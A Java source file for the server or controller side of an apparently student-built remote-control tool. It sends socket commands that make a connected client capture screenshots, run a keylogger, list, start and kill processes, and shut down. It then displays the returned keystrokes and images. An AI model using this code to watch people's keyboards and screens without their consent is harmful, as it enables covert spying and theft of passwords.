package server;

import java.io.IOException;

import javax.swing.ImageIcon;

public class Main {
    static UIManager uiManager;
    static ChatMessageSocket mSocket;

    public static void main(String[] args) {

        uiManager = new UIManager();
        addEvents();

        // System.out.println("SERVER EXIT");

    }

    // call only once when init mSocket
    static void startListening() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (mSocket.isActive()) {
                    Object data = mSocket.readData();
                    if (data instanceof ImageIcon)
                        uiManager.addScreenShotImage((ImageIcon) data);
                    else if (data instanceof Object[][]) {
                        uiManager.displayProcess((Object[][]) data);
                    } else if (data instanceof String) {
                        String txt = (String) data;
                        if (txt.startsWith("$-Key-$"))
                            uiManager.addKeyLogText(txt.substring(7));
                        else if (txt.startsWith("$-Successful-$"))
                            uiManager.inform("Successfully " + txt.substring(14));
                        else if (txt.startsWith("$-Fail-$"))
                            uiManager.inform("Fail to " + txt.substring(8));
                        else
                            uiManager.addMessage(txt);
                    }
                }
            }
        }).start();
    }

    static void addEvents() {
        uiManager.addEvent("Exit", (noArg) -> {
            if (mSocket != null)
                mSocket.close();
        });
        uiManager.addEvent("Send", (msg) -> {
            if (mSocket != null && mSocket.isActive()) {
                if (msg != null && !msg.isEmpty())
                    mSocket.send(msg);
            }
        });
        uiManager.addEvent("Connect", (noArg) -> {
            if (mSocket == null || !mSocket.isActive()) {
                try {
                    mSocket = new ChatMessageSocket();
                    // start listening
                    startListening();
                    uiManager.inform("Successfully connect to client.");
                    
                } catch (IOException e) {
                    uiManager.inform("Fail to connect to client.");
                }
            }
            else
                uiManager.inform("Server is already running.");
        });

        uiManager.addEvent("Capture Screen Shot", (noArg) -> {
            if (mSocket != null && mSocket.isActive()) {
                // System.out.println("GET SCREEN CAPTURE");
                mSocket.send("_SEND_SCREEN_CAPTURE_");
            } else
                uiManager.inform("Connect to client first");
        });

        uiManager.addEvent("Shut Down", (noArg) -> {
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_SHUT_DOWN_");
            else
                uiManager.inform("Connect to client first");
        });

        uiManager.addEvent("Hook Key Log", (noArg) -> {
            // System.out.println("HOOK");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_START_KEY_LOG_");
            else
                uiManager.inform("Connect to client first");
        });
        uiManager.addEvent("Unhook Key Log", (noArg) -> {
            // System.out.println("UNHOOK");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_STOP_KEY_LOG_");
            else
                uiManager.inform("Connect to client first");
        });
        uiManager.addEvent("Show Key Log", (noArg) -> {
            // System.out.println("SHOWKEY");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_SHOW_KEY_LOG_");
            else
                uiManager.inform("Connect to client first");
        });

        uiManager.addEvent("Show Process", (noArg) -> {
            // System.out.println("Showing process...");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_LIST_TASK_");
            else
                uiManager.inform("Connect to client first");
        });
        uiManager.addEvent("Show Apps", (noArg) -> {
            // System.out.println("Showing apps");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_LIST_APP_");
            else
                uiManager.inform("Connect to client first");
        });
        uiManager.addEvent("Start Process", (name) -> {
            // System.out.println("PROCESS START...");
            if (mSocket != null && mSocket.isActive())
                mSocket.send("_START_TASK_ " + name);
            else
                uiManager.inform("Connect to client first");
        });
        uiManager.addEvent("Kill Process", (id) -> {
            // System.out.println("KILLING PROCESS..");
            if (mSocket != null && mSocket.isActive()) {
                if (id.matches("\\d+")) {
                    long pid = Long.parseLong(id);
                    mSocket.send("_KILL_TASK_ " + pid);
                } else
                    uiManager.inform("Id must be a number");
            } else
                uiManager.inform("Connect to client first");
        });
    }
}
